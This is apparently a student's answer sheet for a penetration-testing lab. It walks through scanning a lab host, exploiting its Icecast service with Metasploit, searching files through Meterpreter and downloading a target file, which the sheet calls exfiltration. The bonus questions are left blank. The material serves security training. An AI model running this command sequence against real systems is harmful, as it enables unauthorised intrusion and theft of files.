### Submission
You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: ```nmap -sV 192.168.0.20```

![nmap](/17-Pentration-Testing-2/screenshots/nmap.png)
 
 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > Answer: ```searchsploit icecast```

![searchsploit](/17-Pentration-Testing-2/screenshots/searchsploit_ice.png)

3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > Answer: ```msfconsole```

![msfconsole](/17-Pentration-Testing-2/screenshots/msfconsole.png)
 
 
4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > Answer: ```search icecast```
 
![icecast-search](/17-Pentration-Testing-2/screenshots/icecast-search.png)

   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: ```use 0```

![msf-use](/17-Pentration-Testing-2/screenshots/msf_use.png)
 
 
5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`:
      
     > Answer: ```set RHOST 192.168.0.20```

![rhost](/17-Pentration-Testing-2/screenshots/rhost.png)
 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > Answer: ```run```

![run](/17-Pentration-Testing-2/screenshots/run.png)
 
   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > Answer: ```search -f *secretfile*.txt```

![secret](/17-Pentration-Testing-2/screenshots/search_file.png)
  
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > Answer: ```search -f *recipe*.txt```

![recipe](/17-Pentration-Testing-2/screenshots/recipe.png)
 
 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:


      > Answer: ```download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'```

![recipe](/17-Pentration-Testing-2/screenshots/download.png)
 

8. You can also use Meterpreter's local exploit suggester to find possible exploits.

 
   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

 
#### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer:
 
     
B. Open a Meterpreter shell. 
 
  > Answer: 
 
C. Run the command that displays the target's computer system information:

   > Answer: 



---

&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.